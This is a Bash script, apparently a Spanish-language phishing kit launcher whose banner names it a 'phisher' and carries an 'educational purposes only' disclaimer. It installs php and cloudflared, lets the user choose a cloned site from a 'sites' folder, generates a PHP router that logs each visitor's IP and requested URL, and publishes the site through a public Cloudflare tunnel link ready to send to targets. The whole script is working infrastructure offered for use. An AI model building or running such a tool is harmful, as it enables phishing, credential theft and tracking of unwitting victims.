#!/bin/bash

trap 'printf "\n\n${ROJO}[!] Deteniendo servicios...${RESET}\n"; kill $PHP_PID $CF_PID > /dev/null 2>&1; rm .cftunnel.log > /dev/null 2>&1; exit' SIGINT

NARANJA='\033[0;33m'
ROJO='\033[0;31m'
AMARILLO='\033[1;33m'
AZUL='\033[0;34m'
CIAN='\033[0;36m'
VERDE='\033[0;32m'
RESET='\033[0m'

# --- Función de Instalación ---
check_deps() {
    local missing=()
    if ! command -v php &> /dev/null; then missing+=("php"); fi
    if ! command -v cloudflared &> /dev/null; then missing+=("cloudflared"); fi

    if [ ${#missing[@]} -ne 0 ]; then
        clear
        echo -e "${ROJO}[!] Faltan dependencias: ${missing[*]}${RESET}"
        echo -e "${AMARILLO}¿Deseas instalarlas?${RESET}"
        echo -e "${AZUL}[1]${RESET} Sí, instalar y continuar"
        echo -e "${AZUL}[2]${RESET} No, salir"
        read -p "Selección: " opt_dep
        
        if [ "$opt_dep" == "1" ]; then
            echo -e "${CIAN}[*] Actualizando e instalando...${RESET}"
            if [ -d "/data/data/com.termux" ]; then
                pkg update -y && pkg install php cloudflared -y
            else
                sudo apt-get update -y && sudo apt-get install php wget -y
                if ! command -v cloudflared &> /dev/null; then
                    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
                    sudo dpkg -i cloudflared-linux-amd64.deb
                fi
            fi
            echo -e "${VERDE}[OK] Instalación completada. Reiniciando script...${RESET}"
            sleep 2
            exec bash "$0"
        else
            echo -e "${ROJO}[!] Saliendo...${RESET}"
            exit 1
        fi
    fi
}

banner() {
    clear
    echo -e "${CIAN}  _    _  _____  __  __ _____   _____  _    _  _____  _____  _    _  _____  _____  "
    echo -e " | |  | ||  ___| \\ \\/ /|_   _| |  _ \\| |  | ||_   _|/ ____|| |  | ||  ___||  __ \\ "
    echo -e " | |  | || |__    \\  /   | |   | |_) || |__| |  | | | (___  | |__| || |__  | |__) |"
    echo -e " | |  | ||  __|   /  \\   | |   |  __/ |  __  |  | |  \\___ \\ |  __  ||  __| |  _  / "
    echo -e " | \\__/ || |___  / /\\ \\  | |   | |    | |  | | _| |_ ____) || |  | || |___ | | \\ \\ "
    echo -e "  \\____/ |_____|/_/  \\_\\ |_|   |_|    |_|  |_||_____|_____/ |_|  |_||_____||_|  \\_\\"
    echo -e "                         By Vextu Android                ${RESET}"
    echo -e "${NARANJA}========================================================================${RESET}"
    echo -e "${ROJO} ADVERTENCIA: Solo fines educativos. El mal uso es tu responsabilidad.${RESET}"
    echo -e "${NARANJA}========================================================================${RESET}"
}

# Ejecutar comprobación
check_deps

if [ ! -d "sites" ]; then
    echo -e "${ROJO}[!] Error: La carpeta /sites/ no existe.${RESET}"
    exit 1
fi

banner

echo -e "${AMARILLO}[+] Selecciona un sitio disponible:${RESET}"
opciones=($(ls sites/))
for i in "${!opciones[@]}"; do
    echo -e "${ROJO}[${AZUL}$((i+1))${ROJO}]${RESET} ${opciones[$i]}"
done

echo -e "${NARANJA}----------------------------------------------------${RESET}"
read -p "Seleccion: " seleccion

index=$((seleccion-1))
if [[ $seleccion -lt 1 || $seleccion -gt ${#opciones[@]} ]]; then
    echo -e "${ROJO}[!] Seleccion invalida.${RESET}"
    exit 1
fi

sitio=${opciones[$index]}
read -p "Puerto (Defecto 8080): " puerto
puerto=${puerto:-8080}

# Crear router.php dinámico
cat <<EOF > sites/$sitio/router.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$log_file = __DIR__ . "/access_log.txt";
if (!file_exists(__DIR__ . "/\$ip")) { mkdir(__DIR__ . "/\$ip", 0777, true); }
file_put_contents(\$log_file, date('Y-m-d H:i:s') . " | IP: \$ip | URI: \$_SERVER[REQUEST_URI]\n", FILE_APPEND);
if (\$_SERVER['REQUEST_URI'] == '/' || \$_SERVER['REQUEST_URI'] == '') {
    if (file_exists(__DIR__ . "/index.html")) { include 'index.html'; }
    elseif (file_exists(__DIR__ . "/index.php")) { include 'index.php'; }
    exit;
}
return false;
?>
EOF

echo -e "\n${AMARILLO}[*] Iniciando servidores...${RESET}"

# 1. Iniciar PHP
cd sites/$sitio
php -S 0.0.0.0:$puerto router.php > /dev/null 2>&1 &
PHP_PID=$!

# 2. Iniciar Cloudflare
rm -f .cftunnel.log
cloudflared tunnel --url http://127.0.0.1:$puerto > .cftunnel.log 2>&1 &
CF_PID=$!

echo -e "${AMARILLO}[*] Esperando enlace de Cloudflare...${RESET}"
sleep 6
CF_URL=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .cftunnel.log)

echo -e "${VERDE}[OK] Túneles listos:${RESET}"
echo -e "${CIAN}URL Local:      ${VERDE}http://127.0.0.1:$puerto${RESET}"
echo -e "${CIAN}URL Cloudflare: ${VERDE}${CF_URL:-Error al generar}${RESET}"
echo -e "${AMARILLO}\n[!] Presiona Ctrl+C para salir y cerrar todo.${RESET}"

wait
